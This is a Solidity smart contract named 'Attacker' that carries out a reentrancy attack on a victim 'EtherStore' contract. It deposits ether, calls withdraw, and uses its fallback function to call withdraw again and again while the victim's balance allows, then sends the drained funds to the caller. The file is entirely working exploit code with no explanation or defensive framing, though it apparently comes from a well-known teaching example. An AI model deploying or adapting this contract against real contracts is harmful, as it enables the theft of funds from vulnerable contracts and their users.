// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IEtherStore{
    function withdraw() external;
    function deposit() payable external ;
}

contract Attacker{
    IEtherStore public victimInterface;
    uint256 valueToDrain=10000 gwei;
    constructor(address _victimContract){
        victimInterface=IEtherStore(_victimContract);
    }
    // receive() external payable {
    //     if(address(victimInterface).balance >= valueToDrain){
    //     victimInterface.withdraw();
    //     }
    //  }

    fallback() external payable {
        if(address(victimInterface).balance >=valueToDrain){
        victimInterface.withdraw();
        }
     }
    function exploitWithdrawl() public payable  {
        if(msg.value>=valueToDrain){
        victimInterface.deposit{value:valueToDrain}();
        victimInterface.withdraw();
        }
           
    }

    function withdrawEth() public payable {
        payable(msg.sender).transfer(address(this).balance);
    }
}